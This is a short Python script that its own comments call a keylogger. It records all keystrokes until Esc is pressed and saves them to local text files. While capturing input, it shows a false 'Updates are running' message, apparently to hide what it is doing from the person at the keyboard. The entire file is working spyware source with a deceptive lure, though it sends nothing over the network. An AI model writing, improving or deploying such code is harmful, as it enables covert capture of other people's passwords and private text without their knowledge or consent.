#this is a test of my python keylogger
#module we will be using to record the keystokes
import keyboard

#make the exit keypress be something we can specify in the signup fo
record_key = keyboard.record(until='esc')

rk:list = []

print("Updates are running, close the window to continue with work")

def loggin():
    pass

def remove_unwanted_keys(key_list_rk):
    #checking for substring because that would make life easier
    substring = "down)"
    substring2 = "KeyboardEvent("
    
    for keypress in key_list_rk:
        if substring in keypress:
            keypress_extracted  = keypress.replace(substring, "")
            keypress_extracted_2 =keypress_extracted.replace(substring2, "")
            with open("output.txt", "a") as output:
                output.writelines(str(keypress_extracted_2) + "\n")

def grab_keypresses(rk):

    with open("keystrokes.txt", "w") as k:
        #for each key registered append to the text file
        for key in record_key:
            k.writelines(str(key) + "\n")

    with open("keystrokes.txt", "r") as k:
        for existing_key in k.readlines():
            stripped_key = existing_key.strip()
            rk.append(stripped_key)
            
    remove_unwanted_keys(rk)

grab_keypresses(rk)
